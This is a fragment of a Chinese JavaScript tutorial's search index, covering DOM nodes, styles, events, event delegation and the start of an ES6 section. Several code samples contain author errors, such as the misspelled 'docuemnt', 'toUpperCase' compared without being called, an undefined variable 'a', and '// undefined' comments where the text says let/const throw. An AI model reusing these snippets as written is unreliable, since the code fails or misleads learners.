console.log(div) // <div a=\\\"100\\\"></div> </script> </body> \"]},{\"header\":\"style\",\"slug\":\"style\",\"contents\":[\"专门用来给元素添加 css 样式的，添加的都是行内样式\",\"任何标签都有 style 属性，通过 style 属性可以动态更改网页标签的样式，如要遇到 CSS 属性中包含字符 - 时，要将 - 去掉并将其后面的字母改成大写，转换为小驼峰命名法，如 background-color 要写成 box.style.backgroundColor\",\"<body> <div></div> <script> var div = document.querySelector('div') div.style.width = \\\"100px\\\" div.style.height = \\\"100px\\\" div.style.backgroundColor = \\\"pink\\\" console.log(div) // <div style=\\\"width: 100px; height: 100px; background-color: pink;\\\"></div> </script> </body> \",\"页面中的 div 就会变成一个宽高都是 100，背景颜色是粉色\"]},{\"header\":\"获取元素的非行间样式\",\"slug\":\"获取元素的非行间样式\",\"contents\":[\"我们在操作 DOM 的时候，很重要的一点就是要操作元素的 css 样式，那么在操作 css 样式的时候，我们避免不了就要获取元素的样式，之前我们说过可以用 元素.style.xxx 来获取，但是这个方法只能获取到元素 行间样式，也就是写在行内的样式\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(oDiv.style.height) // 100px console.log(oDIv.style.width) // '' </script> </body> \",\"不管是外链式还是内嵌式，我们都获取不到该元素的样式\",\"这里我们就要使用getComputedStyle和 currentStyle方法来获取，这两个方法的作用是一样的，只不过一个在 非 IE 浏览器，一个在 IE 浏览器\"]},{\"header\":\"getComputedStyle（非IE使用）\",\"slug\":\"getcomputedstyle-非ie使用\",\"contents\":[\"语法：window.getComputedStyle(元素, null).要获取的属性\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(window.getComputedStyle(oDiv).width) // 100px console.log(window.getComputedStyle(oDiv).height) // 100px </script> </body> \",\"这个方法获取行间样式和非行间样式都可以\"]},{\"header\":\"currentStyle（IE使用）\",\"slug\":\"currentstyle-ie使用\",\"contents\":[\"语法： 元素.currentStyle.要获取的属性\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(oDiv.currentStyle.width) // 100px console.log(oDiv.currentStyle.height) // 100px </script> </body> \"]},{\"header\":\"className\",\"slug\":\"classname\",\"contents\":[\"专门用来操作元素的 类名的\",\"<body> <div class=\\\"box\\\"></div> <script> var div = document.querySelector('div') console.log(div.className) // box </script> </body> \",\"也可以设置元素的类名，不过是全覆盖式的操作\",\"<body> <div class=\\\"box\\\"></div> <script> var div = document.querySelector('div') div.className = 'test' console.log(div) // <div class=\\\"test\\\"></div> </script> </body> \",\"在设置的时候，不管之前有没有类名，都会全部被设置的值覆盖\"]},{\"header\":\"DOM节点\",\"slug\":\"dom节点\",\"contents\":[]},{\"header\":\"节点的分类\",\"slug\":\"节点的分类\",\"contents\":[\"DOM 的节点我们一般分为常用的三大类 元素节点 、文本节点 、 属性节点\",\"DOM01.png\",\"元素节点其实就是 HTML 标签，如上图中 head、div、body 等都属于元素节点\",\"属性节点是指 HTML 标签中的属性，如上图中 a 标签的 href 属性、div 标签的 class 属性\",\"文本节点是指 HTML 标签的文字内容，如 title 标签中的文字\",\"根节点 特指 html 标签\"]},{\"header\":\"获取节点\",\"slug\":\"获取节点\",\"contents\":[\"childNodes：获取某一个节点下所有的子一级节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.childNodes) /* NodeList(3) [text, p, text] 0: text 1: p 2: text length: 3 __proto__: NodeList */ </script> </body> \",\"我们会发现，拿到以后是一个伪数组，里面有三个节点：\",\"一个 text：从 <div> 一直到 <p> 中间有一个换行和一堆空格，这个是第一个节点，是一个文本节点\",\"一个 p：这个 p 标签就是第二个节点，这个是一个元素节点\",\"一个 text：从 </p> 一直到 </div> 中间有一个换行和一堆空格，这个是第三个节点，是一个文本节点\",\"children ：获取某一节点下所有的子一级元素节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.children) /* HTMLCollection [p] 0: p length: 1 __proto__: HTMLCollection */ </script> </body> \",\"我们发现只有一个节点了，因为 children 只要元素节点，div 下面又只有一个元素节点，就是 p，所以就只有一个，虽然只有一个，但是也是一个 伪数组\",\"firstChild：获取某一节点下子一级的第一个节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.firstChild) // #text </script> </body> \",\"这个是只获取一个节点，不再是伪数组了，获取的是第一个，第一个就是 <div> 一直到 <p> 的那个换行和空格，是个文本节点\",\"lastChild：获取某一节点下子一级的最后一个节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.lastChild) // #text </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是最后一个，最后一个就是 </p> 一直到 </div> 之间的换行和空格，是个文本节点\",\"firstElementChild：获取某一节点下子一级第一个元素节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.firstElementChild) // <p>hello</p> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是第一个 元素节点，第一个元素节点就是 p 标签，是一个元素节点\",\"lastElementChild：获取某一节点下子一级最后一个元素节点\",\"<body> <div> <p>hello</p> <p>world</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.lastElementChild) // <p>world</p> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是最后一个 元素节点，最后一个元素节点是 <p>world</p>，是一个元素节点\",\"nextSibling：获取某一个节点的 下一个兄弟节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.nextSibling) // #text </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的下一个兄弟节点，因为 id=\\\"b\\\" 的下一个节点，是两个 li 标签之间的换行和空格，所以是一个文本节点\",\"previousSibling：获取某一个节点的 上一个兄弟节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.previousSibling) // #text </script> </body> \",\"只获取一个节点，不在是伪数组，获取的是 id=\\\"b\\\" 这个 li 的上一个兄弟节点，因为 id=\\\"b\\\" 的上一个节点，是两个 li 标签之间的换行和空格，所以是一个文本节点\",\"nextElementSibling：获取某一个节点的下一个元素节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.nextElementSibling) // <li id=\\\"c\\\">!!!</li> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的下一个兄弟元素节点，因为 id=\\\"b\\\" 的下一个兄弟元素节点就是 id=\\\"c\\\" 的 li，是一个元素节点\",\"previousElementSibling：获取某一个节点的上一个元素节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.previousElementSibling) // <li id=\\\"a\\\">hello</li> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的上一个兄弟元素节点，因为 id=\\\"b\\\" 的上一个兄弟元素节点就是 id=\\\"a\\\" 的 li，是一个元素节点\",\"parentNode：获取某一个节点的父节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.parentNode) // <ul>...</ul> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是当前这个 li 的父元素节点，因为这个 li 的父亲就是 ul，所以获取到的就是 ul，是一个元素节点\",\"attributes：获取某一个 元素节点 的所有属性节点\",\"<body> <ul> <li id=\\\"a\\\" a=\\\"100\\\" test=\\\"test\\\">hello</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#a') console.log(oLi.attributes) /* NamedNodeMap {0: id, 1: a, 2: test, id: id, a: a, test: test, length: 3} 0: id 1: a 2: test length: 3 a: a id: id test: test __proto__: NamedNodeMap */ </script> </body> \",\"获取的是一组数据，是该元素的所有属性，也是一个伪数组，这个 li 有三个属性，id 、 a 、 test 三个，所以就获取到了这三个\"]},{\"header\":\"节点属性\",\"slug\":\"节点属性\",\"contents\":[\"我们已经知道节点会分成很多种，而且我们也能获取到各种不同的节点，接下来我们就来学习各种节点之间属性的区别\",\"我们先准备一段代码\",\"<body> <ul test=\\\"我是 ul 的一个属性\\\"> <li>hello</li> </ul> <script> // 先获取 ul var oUl = document.querySelector('ul') // 获取到 ul 下的第一个子元素节点，是一个元素节点 var eleNode = oUl.firstElementChild // 获取到 ul 的属性节点组合，因为是个组合，我们要拿到节点的话要用索引 var attrNode = oUl.attributes[0] // 获取到 ul 下的第一个子节点，是一个文本节点 var textNode = oUl.firstChild </script> </body> \"]},{\"header\":\"nodeType\",\"slug\":\"nodetype\",\"contents\":[\"nodeType：获取节点的节点类型，用数字表示\",\"console.log(eleNode.nodeType) // 1 console.log(attrNode.nodeType) // 2 console.log(textNode.nodeType) // 3 \",\"nodeType === 1 就表示该节点是一个 元素节点\",\"nodeType === 2 就表示该节点是一个 属性节点\",\"nodeType === 3 就表示该节点是一个 文本节点\"]},{\"header\":\"nodeName\",\"slug\":\"nodename\",\"contents\":[\"nodeName：获取节点的节点名称\",\"console.log(eleNode.nodeName) // LI console.log(attrNode.nodeName) // test console.log(textNode.nodeName) // #text \",\"元素节点的 nodeName 就是 大写标签名\",\"属性节点的 nodeName 就是 属性名\",\"文本节点的 nodeName 都是 #text\"]},{\"header\":\"nodeValue\",\"slug\":\"nodevalue\",\"contents\":[\"nodeValue： 获取节点的值\",\"console.log(eleNode.nodeValue) // null console.log(attrNode.nodeValue) // 我是 ul 的一个属性 console.log(textNode.nodeValue) // 换行 + 空格 \",\"元素节点没有 nodeValue\",\"属性节点的 nodeValue 就是 属性值\",\"文本节点的 nodeValue 就是 文本内容\"]},{\"header\":\"总结\",\"slug\":\"总结\",\"contents\":[\"nodeType\",\"nodeName\",\"nodeValue\",\"元素节点\",\"1\",\"大写标签名\",\"null\",\"属性节点\",\"2\",\"属性名\",\"属性值\",\"文本节点\",\"3\",\"#text\",\"文本内容\"]},{\"header\":\"操作节点\",\"slug\":\"操作节点\",\"contents\":[\"我们所说的操作无非就是 增删改查（CRUD）\",\"创建一个节点（因为向页面中增加之前，我们需要先创建一个节点出来）\",\"向页面中增加一个节点\",\"删除页面中的某一个节点\",\"修改页面中的某一个节点\",\"获取页面中的某一个节点\"]},{\"header\":\"创建一个节点\",\"slug\":\"创建一个节点\",\"contents\":[\"createElement：用于创建一个元素节点\",\"// 创建一个 div 元素节点 var oDiv = document.createElement('div') console.log(oDiv) // <div></div> \",\"createTextNode：用于创建一个文本节点\",\"// 创建一个文本节点 var oText = document.createTextNode('我是一个文本') console.log(oText) // \\\"我是一个文本\\\" \"]},{\"header\":\"追加一个节点\",\"slug\":\"追加一个节点\",\"contents\":[\"appendChild：是向一个元素节点的末尾追加一个节点\",\"语法： 父节点.appendChild(要插入的子节点)\",\"// 创建一个 div 元素节点 var oDiv = document.createElement('div') var oText = document.createTextNode('我是一个文本') // 向 div 中追加一个文本节点 oDiv.appendChild(oText) console.log(oDiv) // <div>我是一个文本</div> \",\"insertBefore：向某一个节点前插入一个节点\",\"语法： 父节点.insertBefore(要插入的节点，插入在哪一个节点的前面)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 创建一个元素节点 var oSpan = document.createElement('span') // 将这个元素节点添加到 div 下的 p 的前面 oDiv.insertBefore(oSpan, oP) console.log(oDiv) /* <div> <span></span> <p>我是一个 p 标签</p> </div> */ </script> </body> \"]},{\"header\":\"删除一个节点\",\"slug\":\"删除一个节点\",\"contents\":[\"removeChild：移除某一节点下的某一个节点\",\"语法：父节点.removeChild(要移除的字节点)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 移除 div 下面的 p 标签 oDiv.removeChild(oP) console.log(oDiv) // <div></div> </script> </body> \"]},{\"header\":\"修改一个节点\",\"slug\":\"修改一个节点\",\"contents\":[\"replaceChild：将页面中的某一个节点替换掉\",\"语法： 父节点.replaceChild(新节点，旧节点)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 创建一个 span 节点 var oSpan = document.createElement('span') // 向 span 元素中加点文字 oSpan.innerHTML = '我是新创建的 span 标签' // 用创建的 span 标签替换原先 div 下的 p 标签 oDiv.replaceChild(oSpan, oP) console.log(oDiv) /* <div> <span>我是新创建的 span 标签</span> </div> */ </script> </body> \"]},{\"header\":\"克隆一个节点\",\"slug\":\"克隆一个节点\",\"contents\":[\"cloneNode：克隆一个已有的节点\",\"语法：元素.cloneNode(布尔值)\",\"cloneNode 会克隆出一个跟原标签一样的元素，括号内传入布尔值\",\"若为 true，则代表克隆时会包含后代节点一起克隆\",\"若为 false，则代表克隆时不包含后代节点\",\"默认为 false\"]},{\"header\":\"获取元素的偏移量\",\"slug\":\"获取元素的偏移量\",\"contents\":[\"就是元素在页面上相对于参考父级的左边和上边的距离\"]},{\"header\":\"offsetParent\",\"slug\":\"offsetparent\",\"contents\":[\"获取元素的偏移量参考父级\",\"其实就是假设你要给一个元素 绝对定位 的时候，它是根据谁来进行定位的，那么这个元素的偏移量参考父级就是谁\"]},{\"header\":\"offsetLeft 和 offsetTop\",\"slug\":\"offsetleft-和-offsettop\",\"contents\":[\"获取的是元素左边的偏移量和上边的偏移量\",\"offsetLeft ： 该元素相对于参考父级的左侧偏移量\",\"offsetTop ： 该元素相对于参考父级的上侧偏移量\"]},{\"header\":\"获取元素尺寸\",\"slug\":\"获取元素尺寸\",\"contents\":[\"就是获取元素的 \\\"占地面积\\\"\",\"注意:\",\"获取到的尺寸是没有单位的数字\",\"当元素在页面中不占位置的时候， 获取到的是 0 \",\"display: none; 元素在页面不占位\",\"visibility: hidden; 元素在页面占位\"]},{\"header\":\"offsetWith 和 offsetHeight\",\"slug\":\"offsetwith-和-offsetheight\",\"contents\":[\"offsetWidth ： 获取的是元素 内容 + padding + border 的宽度\",\"offsetHeight ： 获取的是元素 内容 + padding + border 的高度\"]},{\"header\":\"clientWidth 和 clientHeight\",\"slug\":\"clientwidth-和-clientheight\",\"contents\":[\"clientWidth ： 获取的是元素 内容 + padding 的宽度\",\"clientHeight ： 获取的是元素 内容 + padding 的高度\"]},{\"header\":\"获取浏览器窗口尺寸\",\"slug\":\"获取浏览器窗口尺寸\",\"contents\":[\"我们之前学过一个 innerWidth 和 innerHeight，它们获取到的是窗口包含滚动条的尺寸，下面我们学习两个不包含滚动条的尺寸获取方式\",\"document.documentElement.clientWidth ： 可视窗口的宽度\",\"document.documentElement.clientHeight ： 可视窗口的高度\"]},{\"header\":\"事件\",\"slug\":\"事件\",\"contents\":[\"事件是编程语言中的术语，它是用来描述程序的行为或状态的，一旦行为或状态发生改变，便立即调用一个函数\",\"一个事件由什么东西组成\",\"触发谁的事件：事件源\",\"触发什么事件：事件类型\",\"触发以后做什么：事件处理函数\",\"var oDiv = document.querySelector('div') oDiv.onclick = function () {} // 谁来触发事件 => oDiv => 这个事件的事件源就是 oDiv // 触发什么事件 => onclick => 这个事件类型就是 click // 触发之后做什么 => function () {} => 这个事件的处理函数 \",\"我们想要在点击 div 以后做什么事情，就把我们要做的事情写在事件处理函数里面\",\"var oDiv = document.querySelector('div') oDiv.onclick = function () { console.log('你点击了 div') } \",\"当我们点击 div 的时候，就会执行事件处理函数内部的代码，每点击一次，就会执行一次事件处理函数\"]},{\"header\":\"事件的绑定方式\",\"slug\":\"事件的绑定方式\",\"contents\":[\"我们现在给一个注册事件都是使用 onxxx 的方式，但是这个方式不是很好，只能给一个元素注册一个事件，一旦写了第二个事件，那么第一个就被覆盖了\",\"oDiv.onclick = function () { console.log('我是第一个事件') } oDiv.onclick = function () { console.log('我是第二个事件') } \",\"当你点击的时候，只会执行第二个，第一个就没有了，我们还有一种事件监听的方式去给元素绑定事件\",\"使用 addEventListener 的方式添加，这个方法不兼容，在 IE 里面要使用 attachEvent\",\"addEventListener : 非 IE7、8 下使用\",\"语法： 元素.addEventListener('事件类型'， 事件处理函数， 冒泡还是捕获)\",\"这里的第三个参数是可选的，后面事件的传播会详述\",\"oDiv.addEventListener('click', function () { console.log('我是第一个事件') }, false) oDiv.addEventListener('click', function () { console.log('我是第二个事件') }, false) \",\"当你点击 div 的时候，两个函数都会执行，并且会按照你注册的顺序执行，先打印 我是第一个事件 再打印 我是第二个事件\",\"注意： 事件类型的时候不要写 on，点击事件就是 click，不是 onclick\",\"attachEvent ：IE 7 8 下使用\",\"语法： 元素.attachEvent('事件类型'， 事件处理函数)\",\"oDiv.attachEvent('onclick', function () { console.log('我是第一个事件') }) oDiv.attachEvent('onclick', function () { console.log('我是第二个事件') }) \",\"当你点击 div 的时候，两个函数都会执行，并且会按照你注册的顺序倒叙执行，先打印 我是第二个事件 再打印 我是第一个事件\",\"注意： 事件类型的时候要写 on，点击事件就写 onclick\",\"两个方式的区别：\",\"注册事件的时候事件类型参数的书写 \",\"addEventListener ： 不用写 on\",\"attachEvent ： 要写 on\",\"参数个数 \",\"addEventListener ： 一般是三个常用参数\",\"attachEvent ： 两个参数\",\"执行顺序 \",\"addEventListener ： 顺序注册，顺序执行\",\"attachEvent ： 顺序注册，倒叙执行\",\"适用浏览器 \",\"addEventListener ： 非 IE7、8 的浏览器\",\"attachEvent ： IE7、8 浏览器\"]},{\"header\":\"常见的事件类型\",\"slug\":\"常见的事件类型\",\"contents\":[\"我们在写页面的时候经常用到的一些事件，大致分为几类，浏览器事件 、 鼠标事件 、 键盘事件 、 表单事件 、 触摸事件、焦点事件等\"]},{\"header\":\"浏览器事件\",\"slug\":\"浏览器事件\",\"contents\":[\"load ： 页面全部资源加载完毕\",\"scroll ： 浏览器滚动的时候触发\",\"...\"]},{\"header\":\"鼠标事件\",\"slug\":\"鼠标事件\",\"contents\":[\"click ：点击事件\",\"dblclick ：双击事件\",\"contextmenu ： 右键单击事件\",\"mousedown ：鼠标左键按下事件\",\"mouseup ：鼠标左键抬起事件\",\"mousemove ：鼠标移动\",\"mouseover ：鼠标移入事件\",\"mouseout ：鼠标移出事件\",\"mouseenter ：鼠标移入事件\",\"mouseleave ：鼠标移出事件\",\"...\"]},{\"header\":\"键盘事件\",\"slug\":\"键盘事件\",\"contents\":[\"keyup ： 键盘抬起事件\",\"keydown ： 键盘按下事件\",\"keypress ： 键盘按下再抬起事件\",\"...\"]},{\"header\":\"表单事件\",\"slug\":\"表单事件\",\"contents\":[\"change : 表单内容改变事件\",\"input : 表单内容输入事件\",\"submit : 表单提交事件\",\"...\"]},{\"header\":\"触摸事件\",\"slug\":\"触摸事件\",\"contents\":[\"touchstart ： 触摸开始事件\",\"touchend ： 触摸结束事件\",\"touchmove ： 触摸移动事件\",\"...\"]},{\"header\":\"焦点事件\",\"slug\":\"焦点事件\",\"contents\":[\"focus：获得焦点事件\",\"blur：失去焦点事件\"]},{\"header\":\"事件对象\",\"slug\":\"事件对象\",\"contents\":[\"什么是事件对象？就是当你触发了一个事件以后，对该事件的一些描述信息\",\"例如：\",\"你触发一个点击事件的时候，你点在哪个位置了，坐标是多少\",\"你触发一个键盘事件的时候，你按的是哪个按钮\",\"...\",\"每一个事件都会有一个对应的对象来描述这些信息，我们就把这个对象叫做 事件对象\",\"浏览器给了我们一个 黑盒子，叫做 window.event，就是对事件信息的所有描述，比如点击事件，你点在了 0，0 位置，那么你得到的这个事件对象里面对应的就会有这个点位的属性，你点在了 10, 10 位置，那么你得到的这个事件对象里面对应的就会有这个点位的属性\",\"oDiv.onclick = function () { console.log(window.event.X轴坐标点信息) console.log(window.event.Y轴坐标点信息) } \",\"这个玩意很好用，但是一般来说，好用的东西就会有 兼容性问题，在 IE低版本 里面这个东西好用，但是在 高版本IE 和 Chrome 里面不好使了，我们就得用另一种方式来获取 事件对象，在每一个事件处理函数的行参位置，默认第一个就是 事件对象\",\"oDiv.onclick = function (e) { // e 就是和 IE 的 window.event 一样的东西 console.log(e.X轴坐标点信息) console.log(e.Y轴坐标点信息) } \",\"综上所述，我们以后在每一个事件里面，想获取事件对象的时候，都用兼容写法\",\"oDiv.onclick = function (e) { e = e || window.event console.log(e.X轴坐标点信息) console.log(e.Y轴坐标点信息) } \",\"常用属性：\",\"type 当前事件的类型\",\"clientX/clientY 光标相对浏览器可见窗口左上角的位置\",\"offsetX/offsetY 光标相于当前 DOM 元素左上角的位置\",\"key 用户按下的键盘键的值，不提倡使用 keycode\"]},{\"header\":\"事件的传播\",\"slug\":\"事件的传播\",\"contents\":[\"DOM02.png\",\"当元素触发一个事件的时候，其父元素也会触发相同的事件，父元素的父元素也会触发相同的事件，就像上面的图片一样，点击在红色盒子上的时候，会触发红色盒子的点击事件，也是点击在了粉色的盒子上，也会触发粉色盒子的点击事件，也是点击在了 body 上，也会触发 body 的点击事件，也是点击在了 html 上，也会触发 html 的点击事件，也是点击在了 document 上，也会触发 document 的点击事件，也是点击在了 window 上，也会触发 window 的点击事件，也就是说，页面上任何一个元素触发事件，都会一层一层最终导致 window 的相同事件触发，前提是各层级元素得有注册相同的事件，不然不会触发\",\"在事件传播的过程中，有一些注意的点：\",\"只会传播同类事件\",\"只会从点击元素开始按照 html 的结构逐层向上元素的事件会被触发\",\"内部元素不管有没有该事件，只要上层元素有该事件，那么上层元素的事件就会被触发\"]},{\"header\":\"冒泡、捕获、目标\",\"slug\":\"冒泡、捕获、目标\",\"contents\":[\"我们刚才聊过了，每一个事件，都是有可能从自己到 window ，有可能要执行多个同类型事件，那么这个执行的顺序就有一些说法了\",\"目标：你是点击在哪个元素身上了，那么这个事件的 目标 就是什么\",\"冒泡：就是从事件 目标 的事件处理函数开始，依次向外，直到 window 的事件处理函数触发，也就是从下向上的执行事件处理函数\",\"捕获：就是从 window 的事件处理函数开始，依次向内，只要事件 目标 的事件处理函数执行，也就是从上向下的执行事件处理函数\",\"冒泡和捕获的区别：就是在事件的传播中，多个同类型事件处理函数的执行顺序不同\",\"addEventListener 第3个参数为 true 表示捕获阶段触发，false 表示冒泡阶段触发，默认值为 false\"]},{\"header\":\"事件委托\",\"slug\":\"事件委托\",\"contents\":[\"事件委托利用了事件传播的特征来解决一些现实开发中的需求\",\"优点：减少注册次数，可以提高程序性能\",\"原理：事件委托其实是利用事件冒泡的特点 \",\"给父元素注册事件，当我们触发子元素的时候，会冒泡到父元素身上，从而触发父元素的事件\",\"实现：事件对象.target.tagName 可以获得真正触发事件的元素\"]},{\"header\":\"事件触发\",\"slug\":\"事件触发\",\"contents\":[\"点击子元素的时候，不管子元素有没有点击事件，只要父元素有点击事件，那么就可以触发父元素的点击事件\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { console.log('我是 ul 的点击事件，我被触发了') }) </script> </body> \",\"像上面一段代码，当你点击 ul 的时候肯定会触发，但是当你点击 li 的时候，其实也会触发\"]},{\"header\":\"target\",\"slug\":\"target\",\"contents\":[\"target 这个属性是事件对象里面的属性，表示你点击的目标，当你触发点击事件的时候，你点击在哪个元素上，target 就是哪个元素，这个 target 也不兼容，在 IE 下要使用 srcElement\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { e = e || window.event var target = e.target || e.srcElement console.log(target) }) </script> </body> \",\"上面的代码，当你点击 ul 的时候，target 就是 ul，当你点击在 li 上面的时候，target 就是 li\"]},{\"header\":\"委托\",\"slug\":\"委托\",\"contents\":[\"这个时候，当我们点击 li 的时候，也可以触发 ul 的点事件，并且在事件内不，我们也可以拿到你点击的到底是 ul 还是 li，这个时候，我们就可以把 li 的事件委托给 ul 来做\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { e = e || window.event var target = e.target || e.srcElement // 判断你点击的是 li if (target.nodeName.toUpperCase === 'LI') { // 确定点击的是 li // 因为当你点击在 ul 上面的时候，nodeName 应该是 'UL' // 去做点击 li 的时候该做的事情了 console.log('我是 li，我被点击了') } }) </script> </body> \",\"上面的代码，我们就可以把 li 要做的事情委托给 ul 来做\"]},{\"header\":\"默认行为\",\"slug\":\"默认行为\",\"contents\":[]},{\"header\":\"什么是默认行为\",\"slug\":\"什么是默认行为\",\"contents\":[\"默认行为，就是不用我们注册，它自己就存在的事情，比如我们点击鼠标右键的时候，会自动弹出一个菜单，比如我们点击 a 标签的时候，我们不需要注册点击事件，他自己就会跳转页面...\",\"这些不需要我们注册就能实现的事情，我们叫做 默认行为\"]},{\"header\":\"阻止默认行为\",\"slug\":\"阻止默认行为\",\"contents\":[\"有的时候，我们不希望浏览器执行默认事件，比如我给 a 标签绑定了一个点击事件，我点击你的时候希望你能告诉我你的地址是什么，而不是直接跳转链接，那么我们就要把 a 标签原先的默认事件阻止，不让他执行默认事件\",\"我们有两个方法来阻止默认事件\",\"e.preventDefault() : 非 IE 使用\",\"e.returnValue = false ：IE 使用\",\"我们阻止默认事件的时候也要写一个兼容的写法\",\"<a href=\\\"https://www.baidu.com\\\">点击我试试</a> <script> var oA = document.querySelector('a') a.addEventListener('click', function (e) { e = e || window.event console.log(this.href) e.preventDefault ? e.preventDefault() : e.returnValue = false }) </script> \",\"这样写完以后，你点击 a 标签的时候，就不会跳转链接了，而是会在控制台打印出 a 标签的 href 属性的值\"]}]},\"/front-end/javascript-notes/20-ES6.html\":{\"title\":\"ES6\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"ECMAScript 就是 JS 的语法，以前的版本没有某些功能，在 ES5 这个版本的时候增加了一些功能，在 ES6 这个版本的时候又增加了一些功能\",\"因为浏览器是浏览器厂商生产的，ECMAScript 发布了新的功能以后，浏览器厂商需要让自己的浏览器支持这些功能，这个过程是需要时间的，所以到现在，基本上大部分浏览器都可以比较完善的支持了，只不过有些浏览器还是不能全部支持，这就出现了兼容性问题，所以我们写代码的时候就要考虑哪些方法是 ES5 或者 ES6 的，看看是不是浏览器都支持\"]},{\"header\":\"let和const 关键字\",\"slug\":\"let和const-关键字\",\"contents\":[\"我们以前都是使用 var 关键字来声明变量的，在 ES6 的时候，多了两个关键字 let 和 const，也是用来声明变量的\",\"let、const与var的区别：\",\"let 和 const 不允许重复声明变量\",\"// 使用 var 的时候重复声明变量是没问题的，只不过就是后面会把前面覆盖掉 var num = 100 var num = 200 \",\"// 使用 let 重复声明变量的时候就会报错了 let num = 100 let num = 200 // 这里就会报错了 \",\"// 使用 const 重复声明变量的时候就会报错 const num = 100 const num = 200 // 这里就会报错了 \",\"let 和 const 声明的变量不会在预解析的时候解析（也就是没有变量提升）\",\"// 因为预解析（变量提升）的原因，在前面是有这个变量的，只不过没有赋值 console.log(num) // undefined var num = 100 \",\"// 因为 let 不会进行预解析（变量提升），所以直接报错了 console.log(num) // undefined let num = 100 \",\"// 因为 const 不会进行预解析（变量提升），所以直接报错了 console.log(num) // undefined const num = 100 \",\"let 和 const 声明的变量会被所有代码块限制作用范围\",\"// var 声明的变量只有函数能限制其作用域，其他的不能限制 if (true) { var num = 100 } console.log(num) // 100 \",\"// let 声明的变量，除了函数可以限制，所有的代码块都可以限制其作用域（if/while/for/...） if (true) { let num = 100 console.log(num) // 100 } console.log(num) // 报错 \",\"// const 声明的变量，除了函数可以限制，所有的代码块都可以限制其作用域（if/while/for/...） if (true) { const num = 100 console.log(num) // 100 } console.log(num) // 报错 \",\"let 和 const 的区别：\",\"let 声明的变量的值可以改变，const 声明的变量的值不可以改变\",\"let num = 100 num = 200 console.log(num) // 200 \",\"const num = 100 num = 200 // 这里就会报错了，因为 const 声明的变量值不可以改变（我们也叫做常量） \",\"let 声明的时候可以不赋值，const 声明的时候必须赋值，建议使用 const 来声明数组和对象\",\"let num num = 100 console.log(num) // 100 \",\"const num // 这里就会报错了，因为 const 声明的时候必须赋值 \"]},{\"header\":\"展开运算符\",\"slug\":\"展开运算符\",\"contents\":[\"ES6 里面号新添加了一个运算符 ... ，叫做展开运算符\",\"作用：\",\"把数组展开，不会修改原数组\",\"let arr = [1, 2, 3, 4, 5] console.log(...arr) // 1 2 3 4 5 \",\"合并数组的时候可以使用\",\"let arr = [1, 2, 3, 4] let arr2 = [...arr, 5] console.log(arr2) 